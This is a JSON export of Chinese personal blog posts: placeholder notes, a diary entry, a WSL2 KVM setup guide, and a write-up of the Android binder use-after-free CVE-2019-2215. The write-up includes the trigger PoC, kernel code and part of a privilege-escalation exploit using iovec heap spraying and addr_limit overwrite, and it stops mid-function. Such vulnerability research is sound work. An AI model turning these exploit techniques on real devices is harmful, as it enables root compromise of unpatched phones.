[{"content":"ç¼–è¯‘åŸç†ç¬”è®° ç¬”è®°å¾…è¿ç§»ï¼Œå…ˆå ä½ã€‚\n","date":"2023-01-01T00:00:00+08:00","permalink":"https://ykiko.top/p/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/","title":"ç¼–è¯‘åŸç†ç¬”è®°"},{"content":"ç¢ç¢å¿µ 2023-08-26 | æƒ³èµ·äº†èŠ±ï¼Œä»å°å°±çˆ±èŠ±ğŸŒ¸ã€‚å¥½ä¹…æ²¡ä¹°èŠ±äº†ï¼Œä»Šå¤©è·¯è¿‡èŠ±åº—ï¼Œçœ‹åˆ°å‡ æŸè¿˜æœªå¼€æ”¾çš„ã€‚æˆ‘æƒ³äº†æƒ³ï¼Œç›´åˆ°ç°åœ¨ï¼Œä¸€å…±æ”¶åˆ°è¿‡ä¸‰æ¬¡èŠ±ï¼Œç¬¬ä¸€æ¬¡æ˜¯å’ŒæŸäººç¬¬ä¸€æ¬¡è§é¢æ—¶å¥¹å¸¦çš„ä¸€å¤§æ§å…¨çº¢çš„èŠ±(ä¸è®°å¾—èŠ±å)ï¼Œå¥¹è¯´è¿™ä»£è¡¨çƒ­çƒˆçš„çˆ±ï¼Œç¬¬äºŒæ¬¡æ˜¯1024æŸäººæ·˜å®ç»™æˆ‘ä¹°çš„å¹²èŠ±ã€‚ç¬¬ä¸‰æ¬¡æ˜¯æŸäººåœ¨æˆ‘ç”Ÿæ—¥æ—¶ç»™æˆ‘é€çš„äº²æ‰‹ç»‡çš„è£…é¥°èŠ±å½“åšç”Ÿæ—¥ç¤¼ç‰©ã€‚æˆ‘è®°å¿†ä¸­å°±é€è¿‡åˆ«äººä¸€æ¬¡èŠ±ï¼Œå»è§æŸäººæ—¶ï¼Œè·¯è¿‡èŠ±åº—å°±æŒ‘äº†å‡ æ”¯ä¸åŒçš„èŠ±è£…æˆä¸€æŸå¸¦äº†è¿‡å»ã€‚\n2023-08-01 | å…³äºçŒ«ã€‚è¿™æ˜¯æˆ‘å…»çš„ç¬¬ä¸‰åªçŒ«ï¼Œæˆ‘å«å®ƒå…«æ¡(ç°åœ¨å¬åˆ°æˆ‘å–Šå…«æ¡å°±å–µå–µå«)ã€‚\n2023-08-27 | æ²¡æ—¥æ²¡å¤œçš„æ‰“åšå¾·ä¹‹é—¨3ã€‚\n","date":"2023-01-01T00:00:00+08:00","permalink":"https://ykiko.top/p/%E7%A2%8E%E7%A2%8E%E5%BF%B5/","title":"ç¢ç¢å¿µ"},{"content":"ç¼–è¯‘åŸç†ç¬”è®°-å¼€ç¯‡ ç¬”è®°å¾…è¿ç§»ï¼Œå…ˆå ä½ã€‚\n","date":"2022-01-07T00:22:00+08:00","permalink":"https://ykiko.top/p/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0-%E5%BC%80%E7%AF%87/","title":"ç¼–è¯‘åŸç†ç¬”è®°-å¼€ç¯‡"},{"content":"WSL2å¼€å¯kvm 0x00 å‰è¨€ ä¹‹å‰æƒ³ç€ç”¨wsl2å»è·‘qemuï¼Œå‘ç°å¾ˆå¤šå†…æ ¸pwné¢˜ç»™çš„ç¯å¢ƒéœ€è¦å¼€å¯-enable-kvmé€‰é¡¹ï¼Œè¿˜æœ‰è‡ªå·±ç¼–è¯‘çš„å†…æ ¸ä¹Ÿæ²¡æ³•ï¼Œç„¶è€Œwsl2æ²¡æ³•å¼€å¯kvmï¼Œè§£å†³åŠæ³•å°±æ˜¯å»æŠŠhype-vç»™å…³äº†ï¼Œè€è€å®å®ç”¨vmware/vmboxå¼€ä¸ªè™šæ‹Ÿæœºï¼Œè¿™æ ·æ¯æ¬¡éƒ½è¦åˆ‡æ¥åˆ‡å»å¾ˆéº»çƒ¦ã€‚\nç›´åˆ°çœ‹åˆ°vmwareå’Œvmboxéƒ½å¯ä»¥ä¸hype-vå¹¶å­˜ï¼Œä»¥ä¸ºçœ‹åˆ°äº†æ›™å…‰ï¼Œæ²¡æƒ³åˆ°æ˜¯æ²¡æ³•å¼€å¯è™šæ‹ŸåŒ–é€‰é¡¹çš„ã€‚\nåæ¥çœ‹åˆ°WSLä¸Šè¿™ä¸ªIssuesï¼Œå½“æ—¶ä¹Ÿæ²¡è¿™ä¹ˆå¤šè¯„è®ºï¼Œä¸è¿‡æš‚ä¸”èƒ½ç”¨è„šæœ¬å®ç°ã€‚ä¸è¿‡è¿˜æ˜¯å¾ˆéº»çƒ¦ã€‚\næœ€åçœ‹äº†è¿™ç¯‡æ–‡ç« ï¼Œè·Ÿç€è¯•äº†ä¸€éï¼Œä¸€ç›´æ²¡æŠ¥é”™ï¼Œæœ€åè¿˜æ˜¯ä¸è¡Œã€‚æŸå¤©åˆå»çœ‹äº†çœ‹issuseï¼Œå‘ç°è¿™ä¸ªåŠæ³•è¦æœ€æ–°é˜…è§ˆç‰ˆã€‚æ›´æ–°åä¸€ä¸ªæ–°çš„å‘ç°å°±æ˜¯wsl2é€Ÿåº¦æ˜æ˜¾å˜å¿«äº†ã€‚ã€‚\n0x01 ç¯å¢ƒ Windows 10 2004 20175.1000\nWindows Feature Experience Pack 120.18201.0.0\nwsl2 - Ubuntu 20\nIntel i7-8550U\nWSL-Linux-kernel: 4.19.121-microsoft-standard\nqemu 5.0\n0x02 ç¼–è¯‘Kernel 1 2 3 4 5 sudo apt -y install build-essential libncurses-dev bison flex libssl-dev libelf-dev cpu-checker qemu-kvm tar -xf WSL2-Linux-Kernel-4.19.121-microsoft-standard.tar.gz cd WSL2-Linux-Kernel-4.19.104-microsoft-standard/ ## cp Microsoft/config-wsl .config æœ‰bug ä½¿ç”¨æœ€æ–°ç‰ˆcommitå·²ä¿®å¤ make menuconfig .configæ–‡ä»¶ç”¨è¿™ä¸ª æˆ–è€…è¿™ä¸ª\nç¡®ä¿é‡Œé¢çš„é€‰é¡¹kvmçš„é€‰é¡¹ã€‚\nè¿™é‡Œå¯é€‰çš„ç¼–è¯‘ä¸º\u0026lt; M \u0026gt; æ¨¡å—æˆ–è€…\u0026lt; * \u0026gt; å†…ç½®ï¼Œå»ºè®®å†…ç½®å—æ¨¡å—çš„è¯åç»­æ¯æ¬¡é‡å¯éƒ½å¾—è‡ªå·±åŠ è½½ä¸€æ¬¡ã€‚\nç¡®ä¿Linux guest support enableé€‰é¡¹ã€‚\né€€å‡ºä¿å­˜ã€‚\n1 make -j8 waittingâ€¦â€¦â€¦â€¦\n1 2 3 4 cp arch/x86/boot/bzImage /mnt/c/Users/\u0026lt;username\u0026gt;/bzImage nano /mnt/c/Users/\u0026lt;username\u0026gt;/.wslconfig ### å¦‚æœæ˜¯ \u0026lt;M\u0026gt; æ¨¡å—ç¼–è¯‘ sudo make modules_install 1 2 3 4 5 [wsl2] nestedVirtualization=true kernel=C:\\\\Users\\\\\u0026lt;username\u0026gt;\\\\bzImage debugConsole=true ##å¯é€‰ pageReporting=true ##å¯é€‰ 1 2 3 wsl.exe --shutdown Ubuntu wsl.exe -d Ubuntu nano /etc/modprobe.d/kvm-nested.conf modåŠ è½½çš„è¯è¿˜è¦å†™å…¥ï¼š\n1 2 3 4 options kvm-intel nested=1 options kvm-intel enable_shadow_vmcs=1 options kvm-intel enable_apicv=1 options kvm-intel ept=1 ä¹‹å‰æ¨¡å—ç¼–è¯‘çš„æœ‰bugç‰ˆæœ¬çš„å›¾ mountæ— æ³•æŒ‚è½½ã€‚\næˆåŠŸçš„å›¾ å¯ä»¥æŒ‚è½½ã€‚ã€‚æ— éœ€æ‰‹åŠ¨åŠ è½½mod\nè¦å…ˆé…ç½®ç•Œé¢ä»¥åŠGPUæ”¯æŒå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« åç»­çš„éƒ¨åˆ†ï¼Œæ²¡è¿™ä¸ªéœ€æ±‚ã€‚ã€‚\nissuse è¿˜æ˜¯ä¼šé‡åˆ°å¥‡å¥‡æ€ªæ€ªçš„å‘ã€‚\nAn error occurred mounting one of your file systems. Please run 'dmesg' for more details.\næŠ¥é”™ä¿¡æ¯ï¼š\n1 2 3 4 5 6 7 8 [ 2.268879] init: (1) ERROR: MountPlan9WithRetry:282: mount drvfs on /mnt/c (cache=mmap,noatime,msize=262144,trans=virtio,aname=drvfs;path=C:\\;uid=0;gid=0;symlinkroot=/mnt/ [ 2.268880] ) failed: 22 [ 2.277772] 9pnet: Could not find request transport: virtio [ 2.280962] init: (1) ERROR: MountPlan9WithRetry:282: mount drvfs on /mnt/d (cache=mmap,noatime,msize=262144,trans=virtio,aname=drvfs;path=D:\\;uid=0;gid=0;symlinkroot=/mnt/ [ 2.280964] ) failed: 22 [ 2.305491] init: (8) ERROR: CreateProcessParseCommon:874: Failed to translate D:\\openSRC\\WSL2-Linux-Kernel-4.19.121-microsoft-standard [ 2.312584] init: (8) ERROR: UtilTranslatePathList:2624: Failed to translate D:\\Life_Tools\\Sys_Tools\\cmder\\bin [ 2.319445] init: (8) ERROR: UtilTranslatePathList:2624: Failed to translate D:\\Life_Tools\\Sys_Tools\\cmder\\vendor\\bin è¿™æ˜¯å†…æ ¸çš„é—®é¢˜ï¼Œå¾ˆå‘çš„åœ°æ–¹ã€‚æ˜¯å®˜ç½‘æ²¡åˆ‡æ¢æ–°çš„configæ–‡ä»¶é€ æˆçš„ï¼Œæ¢æˆæ–°çš„é‡æ–°ç¼–è¯‘å³å¯ã€‚å…·ä½“çœ‹ç€è¿™ä¸ªissuse ä¿®å¤\né‡æ–°ç¼–è¯‘å†…æ ¸ã€‚\nå‚è€ƒ https://boxofcables.dev/accelerated-kvm-guests-on-wsl-2/\nhttps://github.com/microsoft/WSL/issues/4193\n","date":"2020-07-24T00:00:00+08:00","permalink":"https://ykiko.top/p/wsl2%E5%BC%80%E5%90%AFkvm/","title":"WSL2å¼€å¯kvm"},{"content":"CVE-2019-2215åˆ†æåˆ©ç”¨è®°å½• 0x00 å‰è¨€ CVE-2019-2215æœ€åˆæ˜¯ç”±syzbot(syzkaller bot)åœ¨2017å¹´å‘ç°çš„ä¸€ä¸ªbugï¼Œåœ¨2018å¹´åˆè¯¥bugè¢«ä¿®å¤ï¼Œæ²¡æœ‰åˆ†é…CVEç¼–å·ï¼Œä½†æ˜¯è¯¥è¡¥ä¸æ²¡æœ‰å‘åç§»æ¤åˆ°è®¸å¤šå·²å‘å¸ƒçš„è®¾å¤‡ä¸Š,æ¯”å¦‚Pixelå’Œpixel2ã€‚\nProject Zeroçš„**Maddie Stone (@maddiestone)**æ ¹æ®Googleçš„å¨èƒæƒ…æŠ¥å°ç»„ï¼ˆTAGï¼‰çš„æƒ…æŠ¥æŠ¥å‘Šå†æ¬¡å‘ç°çš„è¯¥bugï¼Œå¥¹åœ¨2019å¹´9æœˆæŠ¥å‘Šäº†è¯¥æ¼æ´ã€‚TAGç¡®è®¤å…¶å·²ç”¨äºç°å®æ”»å‡»ä¸­ï¼ŒTAGè¡¨ç¤ºè¯¥æ¼æ´åˆ©ç”¨å¯èƒ½è·Ÿä¸€å®¶å‡ºå”®æ¼æ´å’Œåˆ©ç”¨å·¥å…·çš„ä»¥è‰²åˆ—å…¬å¸NSOæœ‰å…³ï¼ŒéšåNSOé›†å›¢å‘è¨€äººå…¬å¼€å¦è®¤ä¸è¯¥æ¼æ´å­˜åœ¨ä»»ä½•å…³ç³»ã€‚\n0x01 åˆ†æç¯å¢ƒ Android avd api29 x86_64\nkernelï¼šq-goldfish-android-goldfish-4.14-dev commit id 7a3cee43e935b9d526ad07f20bf005ba7e74d05b\npixel Android 10 kernel 3.18\n0x02 æ¼æ´åˆ†æ æ¼æ´ä¸ºå†…æ ¸ä¸ŠBind IPCçš„ä¸€ä¸ªUAFæ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨å¯æœ¬åœ°ææƒï¼Œæ— éœ€è¿›è¡Œä»»ä½•äº¤äº’ï¼Œå·²è¢«æ¶æ„è½¯ä»¶åˆ©ç”¨ã€‚\nåŸç†åˆ†æ å…ˆçœ‹ä¸€ä¸ªproject-zeroå…¬å¼€çš„poc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* binder_poll() passes the thread-\u0026gt;wait waitqueue that can be slept on for work. When a thread that uses epoll explicitly exits using BINDER_THREAD_EXIT, the waitqueue is freed, but it is never removed from the corresponding epoll data structure. When the process subsequently exits, the epoll cleanup code tries to access the waitlist, which results in a use-after-free. */ #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/epoll.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #define BINDER_THREAD_EXIT 0x40046208ul int main() { int fd, epfd; struct epoll_event event = {.events = EPOLLIN}; fd = open(\u0026#34;/dev/binder\u0026#34;, O_RDONLY); epfd = epoll_create(1000); epoll_ctl(epfd, EPOLL_CTL_ADD, fd, \u0026amp;event); //[1] ioctl(fd, BINDER_THREAD_EXIT, NULL); //[2] } æ¼æ´åŸç†ä½œè€…è¯´çš„å¾ˆç®€å•å°±æ˜¯ä½¿ç”¨epollçº¿ç¨‹è°ƒç”¨BINDER_THREAD_EXITæ—¶ï¼Œä¼šæŠŠbinder_threadé‡Šæ”¾ï¼Œä½†æ˜¯æ²¡æœ‰åœ¨epollæ•°æ®ç»“æ„ä¸­æ¸…é™¤ï¼Œåœ¨åé¢è¿›ç¨‹ç»“æŸæˆ–è€…epollä¸»åŠ¨è°ƒç”¨EPOLL_CTL_DELæ—¶ï¼Œepollåˆä¼šå»éå†å‰é¢é‡Šæ”¾çš„binder_thread-\u0026gt;waitï¼Œå¯¼è‡´UAFã€‚\næ—¢ç„¶æ˜¯ä¸ªUAFçš„æ¼æ´ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸‰ä¸ªç‚¹ï¼šbinder_threadçš„allocateã€freeã€useã€‚\nallocate åœ¨pocä¸­çš„[1]å¤„ï¼Œé€šè¿‡epoll_ctlåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ep_itemå¹¶ä¸”ç»‘å®šäº†fdï¼Œå°†å…¶æ’å…¥åˆ°event_pollçš„çº¢é»‘æ ‘ä¸­ã€‚fdä¸ºå‰é¢é€šè¿‡è°ƒç”¨open()åˆ›å»ºçš„binder_procç»“æ„ä½“å¹¶ä¸”fd-\u0026gt;pricate_data = binder_procï¼Œepfdä¸ºè°ƒç”¨epoll_createåˆ›å»ºçš„ä¸€ä¸ªepollç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“ä¼šæ·»åŠ åˆ°ç»“æ„ä½“é˜Ÿåˆ—ä¸Šã€‚ç»“æ„å¤§æ¦‚å¦‚å›¾ï¼Œå›¾æ¥æº\nfree pocä¸­çš„[2]å¤„ï¼Œè°ƒç”¨ioctlå¯¹fdè¿›è¡ŒBINDER_THREAD_EXITæ“ä½œï¼Œä»fd-\u0026gt;private_dataä¸­é‡Šæ”¾binder_threadç»“æ„ä½“ã€‚æ•´ä¸ªè°ƒç”¨æ ˆå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æœ€ç»ˆè°ƒç”¨åˆ°äº†binder_free_threadé‡Œçš„kfreeé‡Šæ”¾æ‰ã€‚\n1 2 3 4 5 6 7 8 static void binder_free_thread(struct binder_thread *thread) { BUG_ON(!list_empty(\u0026amp;thread-\u0026gt;todo)); binder_stats_deleted(BINDER_STAT_THREAD); binder_proc_dec_tmpref(thread-\u0026gt;proc); put_task_struct(thread-\u0026gt;task); kfree(thread); } use åœ¨å½“å‰çº¿ç¨‹é€€å‡ºæ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨epoll_ctl(epfd, DEL, fd, event)ï¼Œè¿™é‡Œé¢ä¼šè°ƒç”¨åˆ°ep_remove(event_poll, ep_item)ï¼Œè¿™ä¸ªæ–¹æ³•é‡Œé¢ä¼šè¿›è¡Œunlink wait queuesåŒé“¾è¡¨æ“ä½œï¼Œå…¶ä¸­çš„æ“ä½œentry = wait-\u0026gt;entry;è¿™é‡Œçš„æŒ‡é’ˆæŒ‡å‘å·²ç»é‡Šæ”¾çš„binder_thread-\u0026gt;waitã€‚é€ æˆuse after freeã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 static void ep_remove_wait_queue(struct eppoll_entry *pwq) //è¿™é‡Œçš„pwqå°±æ˜¯æˆ‘ä»¬å·²ç»é‡Šæ”¾æ‰çš„binder_thread { wait_queue_head_t *whead; rcu_read_lock(); whead = smp_load_acquire(\u0026amp;pwq-\u0026gt;whead); if (whead) remove_wait_queue(whead, \u0026amp;pwq-\u0026gt;wait); //è¿›å…¥remove_wait_queue rcu_read_unlock(); } void remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry) { unsigned long flags; spin_lock_irqsave(\u0026amp;wq_head-\u0026gt;lock, flags); __remove_wait_queue(wq_head, wq_entry); //è¿™é‡Œä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°\u0026amp;pwq-\u0026gt;waitä¹‹å‰å·²ç»è¢«é‡Šæ”¾ spin_unlock_irqrestore(\u0026amp;wq_head-\u0026gt;lock, flags); } static inline void __remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry) { list_del(\u0026amp;wq_entry-\u0026gt;entry); } static inline void list_del(struct list_head *entry) { __list_del_entry(entry); [...] } static inline void __list_del_entry(struct list_head *entry) { [...] __list_del(entry-\u0026gt;prev, entry-\u0026gt;next); } static inline void __list_del(struct list_head * prev, struct list_head * next) { next-\u0026gt;prev = prev; //unlinkæ“ä½œ WRITE_ONCE(prev-\u0026gt;next, next); } å°†binder_thread-\u0026gt;wait.headçš„æŒ‡é’ˆå†™å…¥binder_thread-\u0026gt;wait.head.prevå’Œbinder_thread-\u0026gt;wait.head.nextã€‚\nPocè°ƒè¯•åˆ†æ è¿™é‡Œæ‰‹ä¸Šæ²¡æœ‰ç›´æ¥èƒ½ç”¨çš„è®¾å¤‡ï¼Œç”¨çš„æ¨¡æ‹Ÿå™¨è°ƒè¯•ã€‚å¯ç›´æ¥æŒ‰ç…§è¿™ä¸ªæ•™ç¨‹çš„é…ç½®è°ƒè¯•ã€‚ä¸è¿‡è¿™ä¸ªæ•™ç¨‹å…³é—­äº†ä¸€äº›ä¿æŠ¤ï¼Œä½¿å¾—åˆ©ç”¨è¦ç®€å•äº›ï¼Œä¸è¿‡è¿‡ç¨‹æ˜¯å·®ä¸å¤šä¸€æ ·çš„ã€‚\nç¼–è¯‘å®Œgoldfishåå¯åŠ¨emulator -show-kernel -no-snapshot -wipe-data -avd 2019-2215 -kernel bzImage -qemu -s -Sç­‰å¾…qemuçš„è¿æ¥ã€‚\ngdbå¯åŠ¨gdb -quiet vmlinux -ex 'target remote :1234' é”®å…¥cç»§ç»­å¯åŠ¨æ¨¡æ‹Ÿå™¨ã€‚\nç­‰å¾…æ¨¡æ‹Ÿå™¨å®Œå…¨å¯åŠ¨åç¼–è¯‘poc pushè¿›æ¨¡æ‹Ÿå™¨ã€‚\nbinder_threadé‡Šæ”¾ä¹‹å‰ï¼Œåç§»a8å¤„ä¸ºwait.headçš„å€¼ï¼Œè¿™é‡Œæˆ‘ä»¬æ‹¥æœ‰å†…æ ¸æºç ä»¥åŠç¼–è¯‘å¥½çš„vmliuxï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç®—å‡ºæ¥wait.headç›¸å¯¹äºbinder_threadåœ°å€çš„åç§»é‡ã€‚\nfreeä¹‹åæœªunlinkä¹‹å‰binder_threadçš„å€¼ä¸€æ ·æœªå˜ã€‚\nunlinkä¹‹åï¼Œbinder_thread-\u0026gt;wait.headå†™å…¥binder_thread-\u0026gt;wait.head.next and binder_thread-\u0026gt;wait.head.prevä¸¤ä¸ªæŒ‡é’ˆã€‚\nåœ¨æœªå¼€å¯KASançš„è®¾å¤‡ä¸Šæˆ‘ä»¬çœ‹ä¸åˆ°ä»»ä½•å¥”æºƒã€‚ä½†æ˜¯è°ƒè¯•æ—¶æˆ‘ä»¬èƒ½çœ‹åˆ°ç¡®å®è§¦å‘äº†æ¼æ´ã€‚\n0x03 æ¼æ´åˆ©ç”¨ æ¼æ´t_threadç»“æ„ä½“å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 struct binder_thread { struct binder_proc *proc; struct rb_node rb_node; struct list_head waiting_thread_node; int pid; int looper; /* only modified by this thread */ bool looper_need_return; /* can be written by other thread */ struct binder_transaction *transaction_stack; struct list_head todo; bool process_todo; struct binder_error return_error; struct binder_error reply_error; wait_queue_head_t wait; struct binder_stats stats; atomic_t tmp_ref; bool is_dead; struct task_struct *task; }; æ³¨æ„çœ‹è¯¥ç»“æ„ä½“ä¸­æœ‰ä¸ªtaskæˆå‘˜ï¼Œä¸ºtask_structç±»å‹ã€‚æˆ‘ä»¬é¦–å…ˆè¦åšçš„å°±æ˜¯æ³„éœ²è¿™ä¸ªç»“æ„ä½“çš„åœ°å€ï¼Œå°†å®ƒæ”¹ä¸ºNULLä¹‹åï¼Œæ‰§è¡Œææƒè¯­å¥ã€‚ä¸‹é¢æ ¹æ®expåˆ†ææ•´ä¸ªææƒçš„æµç¨‹ã€‚\npatch addr_limit é˜»æ­¢æˆ‘ä»¬æ‹¿åˆ°æƒé™çš„ç¬¬ä¸€é“å…³å¡ä¸ºtask_structç»“æ„ä½“æˆå‘˜thread_infoä¸­çš„addr_limitï¼ˆåœ¨x86_64ä¸Šæ˜¯ç›´æ¥ä½œä¸ºtask_structçš„æˆå‘˜ï¼‰ï¼Œç”¨äºéš”ç¦»å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´ã€‚å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶å®ƒçš„å€¼ï¼Œç›¸å½“äºæˆ‘ä»¬èƒ½å®Œå…¨çš„è®¿é—®å†…æ ¸ç©ºé—´ã€‚æ‰€ä»¥ç¬¬ä¸€æ­¥å°±æ˜¯æŠŠaddr_limit patchæ‰ã€‚\næƒ³è¦patchæ‰addr_limitï¼Œå¾—å…ˆæ³„éœ²å‡ºtask_structçš„åœ°å€ï¼Œå†å°†å€¼æ”¹ä¸º0xFFFFFFFFFFFFFFFEã€‚åé¢å†è¯´ä¸ºä»€ä¹ˆè¦æ”¹ä¸ºè¿™ä¸ªå€¼ã€‚\nè¿™é‡Œå…ˆäº†è§£ä¸€ä¸‹vectored I/Oï¼Œä¹Ÿç§°ä¸ºåˆ†æ•£/èšé›† I/Oï¼Œæ˜¯ä¸€ç§å¯ä»¥åœ¨å•æ¬¡ç³»ç»Ÿè°ƒç”¨ä¸­å¯¹å¤šä¸ªç¼“å†²åŒºè¾“å…¥è¾“å‡ºçš„æ–¹æ³•ï¼Œå¯ä»¥æŠŠå¤šä¸ªç¼“å†²åŒºçš„æ•°æ®å†™åˆ°å•ä¸ªæ•°æ®æµï¼Œä¹Ÿå¯ä»¥æŠŠå•ä¸ªæ•°æ®æµè¯»åˆ°å¤šä¸ªç¼“å†²åŒºä¸­ã€‚ä¸çº¿æ€§ I/O ç›¸æ¯”ï¼Œvectored I/Oæœ‰ä¸€äº›ä¼˜åŠ¿ï¼šå¯ä»¥ä½¿ç”¨ä¸è¿ç»­çš„ä¸åŒç¼“å†²åŒºè¿›è¡Œå†™å…¥æˆ–è¯»å–ï¼Œè€Œä¸ä¼šäº§ç”Ÿå¤§é‡å¼€é”€ã€‚æ”¯æŒåŸå­æ€§ã€‚ä½¿ç”¨vectored I/Oå¯ä»¥å°†å¤´éƒ¨å’Œæ•°æ®ä¿å­˜åœ¨å•ç‹¬çš„éè¿ç»­ç¼“å†²åŒºä¸­ï¼Œå¹¶é€šè¿‡ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è€Œä¸æ˜¯ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨å¯¹å…¶è¿›è¡Œè¯»å–æˆ–å†™å…¥ã€‚\nreadv() å‡½æ•°ä»æ–‡ä»¶æè¿°ç¬¦ fd ä¸­è¯»å– count ä¸ªæ®µ (segment) (ä¸€ä¸ªæ®µå³ä¸€ä¸ª iovec ç»“æ„ä½“ï¼‰åˆ°å‚æ•° iov æ‰€æŒ‡å®šçš„ç¼“å†²åŒºä¸­ã€‚\nwrite() å‡½æ•°ä»å‚æ•° iov æŒ‡å®šçš„ç¼“å†²åŒºä¸­è¯»å– count ä¸ªæ®µçš„æ•°æ®ï¼Œå¹¶å†™å…¥ fd ä¸­ã€‚\n1 2 3 #include \u0026lt;sys/uio.h\u0026gt; ssize_t readv (int fd, const struct iovec *iov,vint count); ssize_t writev(int fd,const struct iovec *iov, int count); æ¯ä¸ª iovec ç»“æ„ä½“æè¿°ä¸€ä¸ªç‹¬ç«‹çš„ï¼Œç‰©ç†ä¸è¿ç»­çš„ç¼“å†²åŒºï¼Œæˆ‘ä»¬ç§°å…¶ä¸ºæ®µ(segment)ï¼Œæ¯ä¸ªiovecç»“æ„ä½“ç›¸å¯¹è¾ƒå°ï¼Œåœ¨64bitç³»ç»Ÿä¸‹iovecçš„å¤§å°ä»…ä¸º0x10ã€‚\n1 2 3 4 5 struct iovec { void __user *iov_base; /* BSD uses caddr_t (1003.1g requires void *) */ __kernel_size_t iov_len; /* Must be size_t (1003.1g) */ }; å¦‚ä½•æ³„éœ²å‡ºtask_structï¼Ÿçœ‹äº†å‡ ä¸ªexpï¼Œéƒ½ç”¨çš„æ˜¯struct iovecå»å ä½è¦†ç›–å‰é¢é‡Šæ”¾çš„binder_threadã€‚è¿™ä¹Ÿæ˜¯Project Zeroçš„åšæ³•ã€‚è¿™ä¸ªæ–¹æ³•æœ€åˆæ˜¯ç”±Keenå®éªŒå®¤æå‡ºçš„ï¼Œiovecå…·æœ‰ä¸€äº›å°ç‰¹æ€§ä½¿å¾—å®ƒå¾ˆé€‚åˆç”¨æ¥ä½œä¸ºæ”»å‡»çš„åª’ä»‹ï¼š\nåœ¨64bitç³»ç»Ÿä¸‹åªæœ‰0x10çš„å¤§å°\nå®¹æ˜“æ§åˆ¶å®ƒçš„æˆå‘˜iov_baseå’Œiov_lenã€‚\nå¯ä»¥æ§åˆ¶å†™å…¥çš„ä¸ªæ•°æ§åˆ¶iovecæœ€ç»ˆè¿›å…¥å“ªä¸ªkmallocç¼“å­˜\nå®ƒæœ‰ä¸€ä¸ªæŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆå’Œä¸€ä¸ªé•¿åº¦ï¼Œè¿™æ˜¯ä½¿ç”¨unlinkè¿›è¡Œç ´åçš„ç†æƒ³å­—æ®µ\nå¯é€šè¿‡readvã€writevã€recvmsgã€sendmsgç­‰ç³»ç»Ÿè°ƒç”¨å’Œiovecæ˜¯å®ç°linuxä¸‹çš„Vectored I/Oã€‚åœ¨æ¼æ´åˆ©ç”¨ä¸­æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¥ç»•è¿‡æ£€æŸ¥ï¼Œå¯¹å·²é‡Šæ”¾çš„ç©ºé—´è¿›è¡Œå ä½å¸ƒå±€å †é£æ°´ã€‚\nçœ‹çœ‹expå¦‚ä½•å¦‚æ¥æ³„éœ²ä¿¡æ¯ï¼Œä½œè€…å†™äº†å¾ˆè¯¦ç»†çš„æ³¨é‡Šï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 void BinderUaF::leakTaskStruct() { int pipe_fd[2] = {0}; ssize_t nBytesRead = 0; static char dataBuffer[PAGE_SIZE] = {0}; struct iovec iovecStack[IOVEC_COUNT] = {nullptr}; // Get binder fd setupBinder(); // Create event poll setupEventPoll(); // We are going to use iovec for scoped read/write, // we need to make sure that iovec stays in the kernel // before we trigger the unlink after binder_thread has // been freed. // One way to achieve this is by using the blocking APIs // in Linux kernel. Such APIs are read, write, etc on pipe. // Setup pipe for iovec INFO(\u0026#34;[+] Setting up pipe\\n\u0026#34;); if (pipe(pipe_fd) == -1) { ERR(\u0026#34;\\t[-] Unable to create pipe\\n\u0026#34;); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Pipe created successfully\\n\u0026#34;); } // // pipe_fd[0] = read fd // pipe_fd[1] = write fd // // Default size of pipe is 65536 = 0x10000 = 64KB // This is way much of data that we care about // Let\u0026#39;s reduce the size of pipe to 0x1000 // if (fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE) == -1) { ERR(\u0026#34;\\t[-] Unable to change the pipe capacity\\n\u0026#34;); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Changed the pipe capacity to: 0x%x\\n\u0026#34;, PAGE_SIZE); } INFO(\u0026#34;[+] Setting up iovecs\\n\u0026#34;); // // As we are overlapping binder_thread with iovec, // binder_thread-\u0026gt;wait.lock will align to iovecStack[10].io_base. // // If binder_thread-\u0026gt;wait.lock is not 0 then the thread will get // stuck in trying to acquire the lock and the unlink operation // will not happen. // // To avoid this, we need to make sure that the overlapped data // should be set to 0. // // iovec.iov_base is a 64bit value, and spinlock_t is 32bit, so if // we can pass a valid memory address whose lower 32bit value is 0, // then we can avoid spin lock issue. // mmap4gbAlignedPage(); 